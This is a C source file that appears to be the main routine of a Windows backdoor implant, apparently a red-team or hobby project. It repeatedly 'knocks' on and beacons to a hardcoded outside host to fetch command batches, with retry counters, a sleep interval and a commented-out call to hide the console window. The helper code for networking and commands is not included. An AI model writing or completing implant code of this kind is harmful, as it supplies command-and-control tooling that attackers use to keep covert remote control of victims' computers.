#include <stdio.h>
#include <Windows.h>
#include "Debug.h"
#include "HTTPKnock.h"
#include "HTTPBeacon.h"
#include "BeaconCommand.h"

#define KNOCK_HOSTNAME L"www.deadbeefsecurity.com"
#define BEACON_HOSTNAME L"www.deadbeefsecurity.com"
#define KNOCK_ATTEMPTS 3
#define BEACON_ATTEMPTS 3
#define KNOCK_METHOD TryHTTPKnock
#define BEACON_METHOD TryHTTPBeacon
#define COMM_DELAY 6000

int main(int argc, char* argv[])
{
	DWORD dwSize = sizeof(DWORD);
	DWORD attemptsRemaining = KNOCK_ATTEMPTS;
	DWORD beaconsRemaining = BEACON_ATTEMPTS;
	
	BOOL (*pKnocker)(wchar_t* hostname);
	BOOL knockSuccessful = FALSE;

	BeaconCommand_T* (*pBeaconer)(wchar_t* hostname);
	BeaconCommand_T* pBeaconCommandBatch = NULL;
	
	//FreeConsole();

	pKnocker = KNOCK_METHOD;
	pBeaconer = BEACON_METHOD;

	while (TRUE) {
		Sleep(COMM_DELAY);
		do {
			knockSuccessful = pKnocker(KNOCK_HOSTNAME);
			if (knockSuccessful) {
				debug("Knock successful!");
				break;
			}
			attemptsRemaining--;

		} while (attemptsRemaining > 0);

		if (!knockSuccessful) {
			debug("Knocking failed");
			goto Error;
		}

		pBeaconCommandBatch = pBeaconer(BEACON_HOSTNAME);

		if (!pBeaconCommandBatch) {
			if (!beaconsRemaining) {
				debug("Beacon failed");
				goto Error;
			}
			beaconsRemaining--;
		} else {
			free(pBeaconCommandBatch);
			beaconsRemaining = BEACON_ATTEMPTS;
			debug("Beacon success");
		}

	}

Error:	
	return 0;
}